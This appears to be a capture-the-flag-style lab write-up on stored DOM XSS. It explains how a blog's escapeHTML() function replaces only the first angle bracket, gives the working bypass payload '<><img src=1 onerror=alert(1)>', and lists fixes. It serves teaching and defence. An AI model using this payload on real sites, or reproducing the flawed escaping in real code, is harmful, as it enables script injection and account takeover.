# Lab: Stored DOM XSS

**Category:** Cross-Site Scripting (XSS)\
**Difficulty:** Practitioner\
**Objective:** Exploit a stored DOM vulnerability to call the `alert()` function.

## 0. Attacker mindset

Stored DOM XSS occurs when user input is stored on the server and later displayed on a page, but the dangerous manipulation happens entirely in client-side JavaScript. Unlike traditional stored XSS where the server reflects the payload directly in HTML, here the server serves clean data, and client-side JavaScript processes it unsafely. The attacker must understand the client-side filtering logic to bypass it.

## 1. What is the vulnerability?

The blog comment functionality stores comments and displays them on the page. However, the rendering is done by client-side JavaScript that attempts to escape HTML - but **the escaping is flawed**.

### The HTML Page

The blog post page includes:

```html
<span id='user-comments'>
    <script src='/resources/js/loadCommentsWithVulnerableEscapeHtml.js'></script>
    <script>loadComments('/post/comment')</script>
</span>
```

### The Vulnerable JavaScript (`loadCommentsWithVulnerableEscapeHtml.js`)

```javascript
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```

### The Vulnerability

The `escapeHTML()` function uses `replace()` with **strings**, not regular expressions with the global flag.

**Critical behavior:** `replace('<', '&lt;')` only replaces the **FIRST** `<` character. Any subsequent `<` characters remain unchanged.

| Input | `replace('<', '&lt;')` output |
|-------|-------------------------------|
| `<script>` | `&lt;script>` |
| `<<script>` | `&lt;<script>` |
| `<><img src=1 onerror=alert(1)>` | `&lt;><img src=1 onerror=alert(1)>` |

Notice: in the last example, the first `<` becomes `&lt;`, but the second `<` (inside `><img...`) is untouched!

## 2. How did I exploit it?

### Discovery

First, identified that comments are loaded dynamically. Looked at the page source and found the script tags:

```html
<span id='user-comments'>
    <script src='/resources/js/loadCommentsWithVulnerableEscapeHtml.js'></script>
    <script>loadComments('/post/comment')</script>
</span>
```

Then fetched the JavaScript file:
```
GET /resources/js/loadCommentsWithVulnerableEscapeHtml.js
```

Found the vulnerable `escapeHTML()` function using `replace()` without the global flag.

### Code Analysis

The `displayComments()` function uses `escapeHTML()` on:
- `comment.avatar` (image source)
- `comment.author` (author name)
- `comment.body` (comment text)

The most promising injection point is `comment.body` because it's inserted via `innerHTML`:

```javascript
if (comment.body) {
    let commentBodyPElement = document.createElement("p");
    commentBodyPElement.innerHTML = escapeHTML(comment.body);
    commentSection.appendChild(commentBodyPElement);
}
```

### The Bypass

Because `escapeHTML()` only escapes the **first** `<` and the **first** `>`, we can bypass it by providing a payload where the first `<` is a decoy.

**Decoy concept:**
- The first `<` gets converted to `&lt;` (harmless)
- The second `<` (and subsequent ones) are NOT escaped → they become real HTML tags

### Testing Different Payloads

Attempted multiple variations:
- `<<[payload]>>`
- `<<<[payload]>>>`
- `<><[payload]>`

### The Winning Payload

```html
<><img src=1 onerror=alert(1)>
```

**How it's processed:**

| Step | What happens |
|------|---------------|
| 1 | `escapeHTML()` receives `'<><img src=1 onerror=alert(1)>'` |
| 2 | First `replace('<', '&lt;')` → `'&lt;><img src=1 onerror=alert(1)>'` |
| 3 | Second `replace('>', '&gt;')` → first `>` becomes `&gt;` → `'&lt;&gt;<img src=1 onerror=alert(1)>'` |
| 4 | The result is: `&lt;&gt;<img src=1 onerror=alert(1)>` |
| 5 | When set as `innerHTML`, `<img src=1 onerror=alert(1)>` is rendered as HTML |
| 6 | The image fails to load (`src=1` doesn't exist) → `onerror` fires → `alert(1)` executes |

## 3. Impact

- Persistent stored XSS - every user who views the comment page executes the payload
- The payload executes automatically when the comment loads (no user interaction beyond viewing the page)
- Bypasses the naive HTML escaping attempt
- Can lead to session hijacking, credential theft, or account takeover

## 4. How can it be fixed?

### The Problem

```javascript
// BAD - only replaces FIRST occurrence
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```

### Fixes

#### 1. Use global regex (simple fix)
```javascript
// GOOD - replaces ALL occurrences
function escapeHTML(html) {
    return html.replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
```

#### 2. Use a proper HTML escaping library
```javascript
// BEST - handles all special characters
function escapeHTML(str) {
    return str.replace(/[&<>]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        return m;
    });
}
```

#### 3. Use `textContent` instead of `innerHTML`
```javascript
// SAFEST - no HTML parsing at all
commentBodyPElement.textContent = comment.body;
```

#### 4. Use a sanitization library like DOMPurify
```javascript
// For when you actually need HTML
commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body);
```

---

## Key Insight: JavaScript `replace()` String vs Regex

| Method | Behavior |
|--------|----------|
| `replace('<', '&lt;')` | Only replaces **first** `<` |
| `replace(/</g, '&lt;')` | Replaces **all** `<` (global flag) |
| `replaceAll('<', '&lt;')` | Replaces **all** `<` (ES2021+) |

This is a **very common security mistake** that developers make when they assume `replace()` works like `replaceAll()`.

---

## Comparison with Previous Stored XSS Lab

| Aspect | Lab 2 (Stored XSS simple) | Lab 13 (Stored DOM XSS) |
|--------|---------------------------|-------------------------|
| Server encodes? | No | No (sends raw data) |
| Client encodes? | No | Yes (flawed `escapeHTML()`) |
| Where is the flaw? | Server-side | Client-side JavaScript |
| Bypass technique | Direct injection | `<><payload>` (double angle brackets) |

---

**MITRE ATT&CK:** [T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)